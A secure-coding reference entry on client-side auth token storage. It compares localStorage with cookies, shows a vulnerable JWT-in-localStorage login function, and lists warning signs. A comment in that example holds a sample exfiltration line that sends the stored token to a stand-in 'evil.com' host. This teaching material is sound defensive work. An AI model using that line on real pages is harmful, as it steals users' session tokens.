---
id: auth-token-storage
domain: cross-cutting
category: security
depends_on:
  - xss-prevention
  - csrf-prevention
related:
  - injection-prevention
  - environment-configuration
anti_pattern_of: null
severity: critical
---

# Auth Token Storage

## Definition
Auth token storage is the decision of where and how to keep authentication credentials (JWTs, session tokens, API keys) on the client side -- balancing accessibility to your JavaScript code against protection from XSS and CSRF attacks.

## Why It Matters
Where you store the token determines your attack surface. A token in `localStorage` is accessible to any JavaScript running on your page -- one XSS vulnerability and the attacker has the token, can exfiltrate it, and can use it from their own machine indefinitely (or until it expires). A token in a cookie is automatically sent with every request, making CSRF possible but immune to JavaScript theft if the `HttpOnly` flag is set. There is no perfect option -- each storage mechanism trades one risk for another. But there are clearly wrong options, and most self-taught developers pick one of them.

## The Anti-Pattern
A self-taught developer typically stores JWTs in `localStorage` because it is the simplest approach -- `localStorage.setItem('token', jwt)` and attach it to requests with an Authorization header. They do not consider that `localStorage` is accessible to every script on the page, including third-party analytics, ad scripts, and any XSS payload:

```javascript
// Common but vulnerable pattern: JWT in localStorage
async function login(email, password) {
  const res = await fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ email, password })
  });
  const { token } = await res.json();
  // Any XSS attack can now steal this token:
  // fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))
  localStorage.setItem('token', token);
}

// Every API call reads from localStorage
async function fetchProfile() {
  const token = localStorage.getItem('token');
  return fetch('/api/profile', {
    headers: { Authorization: `Bearer ${token}` }
  });
}
```

A slightly more aware developer puts the token in a cookie but forgets `HttpOnly`, `Secure`, and `SameSite` flags -- giving them the CSRF vulnerability of cookies without the XSS protection that `HttpOnly` provides.

## Recognition Signal
- `localStorage.setItem('token', ...)` or `sessionStorage.setItem('token', ...)` anywhere in the codebase
- JWTs visible in browser DevTools under Application > Local Storage
- Cookies set without `HttpOnly`, `Secure`, or `SameSite` attributes
- Tokens that never expire or have expiration times of days/weeks
- No refresh token mechanism -- the access token is long-lived to avoid re-authentication
- API keys or secrets hardcoded in frontend JavaScript files
- Authentication tokens sent in URL query parameters (they appear in server logs, browser history, and referrer headers)

## Related Concepts
**XSS prevention** is the prerequisite for any storage decision -- if your app has an XSS vulnerability, `localStorage` tokens are immediately compromised. With strong XSS prevention, the risk of `localStorage` is reduced but not eliminated (third-party scripts are still a vector). **CSRF prevention** is the counterpart risk: `HttpOnly` cookies are immune to XSS theft but vulnerable to CSRF, so you need CSRF tokens when using cookie-based auth. **Environment configuration** connects because the server-side secret used to sign JWTs or encrypt sessions must be stored securely in environment variables, not in source code.
